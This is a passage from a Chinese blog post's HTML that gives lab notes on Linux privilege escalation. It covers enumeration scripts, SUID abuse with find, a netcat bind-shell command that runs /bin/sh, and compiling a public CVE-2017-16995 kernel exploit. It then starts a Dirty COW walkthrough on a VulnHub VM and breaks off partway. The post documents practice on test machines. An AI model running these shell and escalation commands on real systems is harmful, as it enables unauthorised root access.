@@ -1,0 +1,1365 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="权限提升-Linux提权1, 小白">
+    <meta name="description" content="0x00脑图：
+0x01 信息收集LinEnum、linuxprivchecker脚本0x00 LinEnum需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。
+（tmp目录是linux临时目录，可">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>权限提升-Linux提权1 | 小白</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: 100% 100%;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">小白</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">小白</div>
+        <div class="logo-desc">
+            
+            记录网安学习的日常
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">权限提升-Linux提权1</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                                <span class="chip bg-color">权限提升</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="post-category">
+                                权限提升
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-06-23
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/Linux%E6%8F%90%E6%9D%83.png" alt="Linux提权"></p>
+<h2 id="0x01-信息收集LinEnum、linuxprivchecker脚本"><a href="#0x01-信息收集LinEnum、linuxprivchecker脚本" class="headerlink" title="0x01 信息收集LinEnum、linuxprivchecker脚本"></a>0x01 信息收集LinEnum、linuxprivchecker脚本</h2><h3 id="0x00-LinEnum"><a href="#0x00-LinEnum" class="headerlink" title="0x00 LinEnum"></a>0x00 LinEnum</h3><p>需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。</p>
+<p>（tmp目录是linux临时目录，可读写可执行，若是上传其他目录有可能当前权限不够导致上传失败或者执行不了，linux提权优先上传tmp目录）</p>
+<p>来到“tmp”目录下</p>
+<pre><code>cd /tmp
+</code></pre>
+<p>如果文件不能被执行，给予其一个可执行权限</p>
+<pre><code>chmod +x LinEnum.sh
+
+chmod +x [文件名]
+</code></pre>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624101007086.png" alt="image-20220624101007086"></p>
+<p>执行文件</p>
+<pre><code>./LinEnum.sh
+
+./[文件名]
+</code></pre>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624101307425.png" alt="image-20220624101307425"></p>
+<p>通过信息搜集可以查看是否窜在SUID提权的可能，或者可以利用的其他信息。</p>
+<h3 id="0x01-linuxprivchecker"><a href="#0x01-linuxprivchecker" class="headerlink" title="0x01 linuxprivchecker"></a>0x01 linuxprivchecker</h3><p>需要通过webshell权限或文件上传权限上传“linuxprivchecker.py”到“tmp”文件夹下，还需要目标机器上有python环境。</p>
+<p>来到“tmp”目录下，执行文件</p>
+<pre><code>python linuxprivchecker.py
+</code></pre>
+<p>linuxprivchecker会列出目标机器的信息。</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624101608291.png" alt="image-20220624101608291"></p>
+<p>由于是python脚本，靶机没有安装python环境，导致执行不了。命令执行如图。</p>
+<h2 id="0x02-漏洞探针linux-exploit-suggester1-2脚本"><a href="#0x02-漏洞探针linux-exploit-suggester1-2脚本" class="headerlink" title="0x02 漏洞探针linux-exploit-suggester1-2脚本"></a>0x02 漏洞探针linux-exploit-suggester1-2脚本</h2><h3 id="0x00-linux-exploit-suggester"><a href="#0x00-linux-exploit-suggester" class="headerlink" title="0x00 linux-exploit-suggester"></a>0x00 linux-exploit-suggester</h3><p>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester.sh”到“tmp”文件夹下</p>
+<p>来到“tmp”目录下，执行文件</p>
+<pre><code>./linux-exploit-suggester.sh
+</code></pre>
+<p>linux-exploit-suggester首先会输出内核等信息，然后输出可能存在的漏洞，包括exp的下载地址，可以下载对应的exp来测试。</p>
+<h3 id="0x01-linux-exploit-suggester2"><a href="#0x01-linux-exploit-suggester2" class="headerlink" title="0x01 linux-exploit-suggester2"></a>0x01 linux-exploit-suggester2</h3><p>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester-2.pl”到“tmp”文件夹下，还需要目标机器上有perl环境</p>
+<p>来到“tmp”目录下，执行文件</p>
+<pre><code>perl linux-exploit-suggester-2.pl
+</code></pre>
+<p>linux-exploit-suggester2会直接报告可能的漏洞和exp下载地址。</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094314803.png" alt="image-20220624094314803"></p>
+<h2 id="0x03-SUID"><a href="#0x03-SUID" class="headerlink" title="0x03 SUID"></a>0x03 SUID</h2><p>###0x00 介绍</p>
+<p>SUID (Set UID)是Linux中的一种特殊权限,其功能是用户在运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件。</p>
+<pre><code>    在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.，利用此特性,我们可通过SUID进行提权。
+</code></pre>
+<h3 id="0x01-设置和取消SUID"><a href="#0x01-设置和取消SUID" class="headerlink" title="0x01 设置和取消SUID"></a>0x01 设置和取消SUID</h3><blockquote>
+<p>查看可执行文件是否有suid权限：<br>ls -alh 文件名</p>
+</blockquote>
+<blockquote>
+<p>设置suid权限：</p>
+<p>chmod u+s 可执行文件</p>
+</blockquote>
+<blockquote>
+<p>取消suid权限：</p>
+<p>chmod u-s 可执行文件</p>
+</blockquote>
+<h2 id="0x04-SUID进行Linux提权"><a href="#0x04-SUID进行Linux提权" class="headerlink" title="0x04  SUID进行Linux提权"></a>0x04  SUID进行Linux提权</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>利用LinEnum.sh搜集SUID相关信息：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624103714316.png" alt="image-20220624103714316"></p>
+<p>寻找这几个关键字具有SUID权限的二进制可执行文件提权：</p>
+<pre class="line-numbers language-none"><code class="language-none">Nmap，Vim，find，Bash，More，Less，Nano，cp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者利用手工探针：</p>
+<p>原理：<br>这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null
+find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null （适用Ubuntu）
+find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624104448920.png" alt="image-20220624104448920"></p>
+<p>可以看到没有可利用的文件。</p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>将&#x2F;usr&#x2F;bin目录下，将find文件以root赋予suid权限：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624105237895.png" alt="image-20220624105237895"></p>
+<p>再利用手工探针：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624105342840.png" alt="image-20220624105342840"></p>
+<p>可以看到有find文件。</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>（没有环境，搭建失败了）</p>
+<p>之后使用冰蝎连接，然后利用MSF连接冰蝎反弹的shell；</p>
+<p>再执行以下命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">touch test
+-find test -exec whoami \; #查看返回的当前权限；（原理：find test文件，并且以find文件的权限执行：whoami命令，如果find是suid,普通用户执行find命令也会获得root权限，再执行whoami就是root）
+find test -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \; #nc(netcat) 反弹 shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>参考文章：<br><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>
+<h2 id="0x05-Linux本地内核漏洞提权"><a href="#0x05-Linux本地内核漏洞提权" class="headerlink" title="0x05 Linux本地内核漏洞提权"></a>0x05 Linux本地内核漏洞提权</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>靶机：墨者学院 Ubuntu 16.04漏洞复现(CVE-2017-16995)</p>
+<h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>先使用ssh连接靶机：</p>
+<blockquote>
+<p>ssh -p 端口号 linux服务器用户名@linux服务器ip地址</p>
+</blockquote>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624083730603.png" alt="image-20220624083730603"></p>
+<p>查看id，普通用户<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624083840869.png" alt="image-20220624083840869"></p>
+<blockquote>
+<p>1、ID&#x3D;0<br>当 UID 是 0 时，代表这个账号是『系统管理员』！当你要创建一个账户为另一个系统管理员账号时， 你可以将该账号的 UID 改成 0 即可；这也就是说，一部系统上面的系统管理员不一定只有 root ！ 但强烈建议避免多个账号的 UID 配置为 0 。</p>
+<p>2、ID&#x3D;1<del>499（系统使用）<br>该范围内的用户id是保留给系统使用的 ID，其实 1</del>65534 之间的账号并没有不同， 也就是除了 0 之外，其它的 UID 并没有不一样，预设 500 以下给系统作为保留账号只是一个习惯。这样的好处是，以有名的 DNS 服务器的启动服务『 named 』为例，这个程序的预设所有人 named 的账号 UID 是 25 ，当你自定义的账号也是 25 时，会造成系统冲突！为了杜绝这样的问题，养成好习惯，保留 500 以前的 UID 给系统使用！</p>
+<p>注： 一般来说， 1到99 会保留给系统预设的账号，另外 100~499 则保留给一些服务来使用。</p>
+<p>3、ID&#x3D;500~65535 给一般使用者用的。</p>
+</blockquote>
+<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>上传漏洞探针脚本进行检测：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094201185.png" alt="image-20220624094201185"></p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094314803.png" alt="image-20220624094314803"></p>
+<p>可以看到探测出三个可利用漏洞；CVE-2017-16995也存在。</p>
+<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>下载CVE-2017-16995EXP：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094633461.png" alt="image-20220624094633461"></p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094653824.png" alt="image-20220624094653824"></p>
+<p>将45010.c文件上传至靶机：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094814591.png" alt="image-20220624094814591"></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>由于c文件，需要编译运行：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095010262.png" alt="image-20220624095010262"></p>
+<p>执行文件发现权限不够，修改权限：</p>
+<blockquote>
+<p>chomd +x 45010.c</p>
+</blockquote>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095135941.png" alt="image-20220624095135941"></p>
+<blockquote>
+<p>使用以下命令先编译：<br>gcc 45010.c -o 45010</p>
+<p>再执行：</p>
+<p>.&#x2F;45010</p>
+</blockquote>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095517115.png" alt="image-20220624095517115"></p>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>查看当前权限：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095554777.png" alt="image-20220624095554777"></p>
+<p>可以看到成功提权。</p>
+<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>这个时候访问root目录下的key.txt文件得到key值：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624100331322.png" alt="image-20220624100331322"></p>
+<h2 id="0x06-脏牛Linux内核提权"><a href="#0x06-脏牛Linux内核提权" class="headerlink" title="0x06 脏牛Linux内核提权"></a>0x06 脏牛Linux内核提权</h2><h3 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h3><p>靶机：vulnhub-Lampiao</p>
+<p>攻击机：Kali</p>
+<h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>namp扫一下网段：</p>
+<pre class="line-numbers language-none"><code class="language-none">nmap x.x.x.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200236287.png" alt="image-20220624200236287"></p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200211257.png" alt="image-20220624200211257"></p>
+<p>可以看到192.168.216.151这个主机存在80端口。</p>
+<h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>访问这个web服务：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200422897.png" alt="image-20220624200422897"></p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200413371.png" alt="image-20220624200413371"></p>
+<p>没有什么关键信息。</p>
+<h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>再使用nmap针对这个主机扫描所有端口：</p>
+<pre class="line-numbers language-none"><code class="language-none">nmap -p1-65535 192.168.216.151<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200803493.png" alt="image-20220624200803493"></p>
+<p>又扫到一个1898端口开放的服务，直接访问。</p>
+<h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200848384.png" alt="image-20220624200848384"></p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200856765.png" alt="image-20220624200856765"></p>
+<p>是一个web服务。</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200949207.png" alt="image-20220624200949207"></p>
+<p>页底有一个Powered by Drupal，猜测是一个cms，网上直接搜。</p>
+<h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624201111502.png" alt="image-20220624201111502"></p>
+<h3 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h3><p>这里直接使用MSF搜索相关漏洞：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624201357307.png" alt="image-20220624201357307"></p>
+<p>直接使用2018年最新的exploit进行漏洞利用，设置攻击ip和对应端口，</p>
+<p>（2019年漏洞显示normal不可利用）</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624202340135.png" alt="image-20220624202340135"></p>
+<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>返回会话成功：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624202419183.png" alt="image-20220624202419183"></p>
+<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>查看权限为普通权限：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624202457991.png" alt="image-20220624202457991"></p>
+<p>使用漏洞探针脚本上传到靶机进行探针：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624203945287.png" alt="image-20220624203945287"></p>
+<p>可以看到没有执行权限，添加权限后执行脚本：</p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624204100119.png" alt="image-20220624204100119"></p>
+<p>这里没有给出脏牛漏洞。</p>
+<p>直接下载脏牛漏洞：</p>
